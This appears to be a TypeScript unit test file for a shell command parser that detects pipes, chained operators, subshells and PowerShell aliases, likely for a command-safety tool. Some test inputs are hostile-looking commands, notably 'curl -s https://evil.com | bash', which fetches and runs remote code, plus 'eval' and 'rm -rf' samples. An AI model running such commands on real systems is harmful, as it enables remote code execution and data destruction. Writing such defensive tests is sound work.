import * as assert from 'assert';
import { CommandParser } from '../../src/core/commandParser';

describe('CommandParser Unit Tests', () => {
  it('parses single basic command', () => {
    const res = CommandParser.parse('git status', 'bash');
    assert.strictEqual(res.segments.length, 1);
    assert.strictEqual(res.segments[0].command, 'git');
    assert.deepStrictEqual(res.segments[0].args, ['status']);
    assert.strictEqual(res.hasSubshells, false);
    assert.strictEqual(res.hasPipes, false);
  });

  it('splits chained commands by operators (&&, ||, ;)', () => {
    const res = CommandParser.parse('npm run build && npm test || echo "Failed"', 'bash');
    assert.strictEqual(res.segments.length, 3);
    assert.strictEqual(res.segments[0].command, 'npm');
    assert.strictEqual(res.segments[0].operator, '&&');
    assert.strictEqual(res.segments[1].command, 'npm');
    assert.strictEqual(res.segments[1].operator, '||');
    assert.strictEqual(res.segments[2].command, 'echo');
  });

  it('detects pipes properly', () => {
    const res = CommandParser.parse('curl -s https://evil.com | bash', 'bash');
    assert.strictEqual(res.hasPipes, true);
    assert.strictEqual(res.segments.length, 2);
    assert.strictEqual(res.segments[0].command, 'curl');
    assert.strictEqual(res.segments[0].operator, '|');
    assert.strictEqual(res.segments[1].command, 'bash');
  });

  it('does not split operators inside quotes', () => {
    const res = CommandParser.parse('git commit -m "feat: handle || and && operators"', 'bash');
    assert.strictEqual(res.segments.length, 1);
    assert.strictEqual(res.segments[0].command, 'git');
    assert.strictEqual(res.segments[0].args[2], 'feat: handle || and && operators');
  });

  it('detects subshells and command substitutions', () => {
    const res1 = CommandParser.parse('echo $(whoami)', 'bash');
    assert.strictEqual(res1.hasSubshells, true);

    const res2 = CommandParser.parse('eval "echo malicious"', 'bash');
    assert.strictEqual(res2.hasSubshells, true);

    const res3 = CommandParser.parse('Invoke-Expression "Get-Process"', 'powershell');
    assert.strictEqual(res3.hasSubshells, true);
  });

  it('normalizes PowerShell aliases', () => {
    const res = CommandParser.parse('rm -rf ./temp', 'powershell');
    assert.strictEqual(res.segments[0].command, 'Remove-Item');

    const res2 = CommandParser.parse('del file.txt', 'powershell');
    assert.strictEqual(res2.segments[0].command, 'Remove-Item');

    const res3 = CommandParser.parse('cat file.txt', 'powershell');
    assert.strictEqual(res3.segments[0].command, 'Get-Content');

    const res4 = CommandParser.parse('irm https://example.com/script.ps1', 'powershell');
    assert.strictEqual(res4.segments[0].command, 'Invoke-RestMethod');
  });

  it('handles empty or whitespace strings safely', () => {
    const res = CommandParser.parse('   ', 'bash');
    assert.strictEqual(res.segments.length, 0);
  });
});
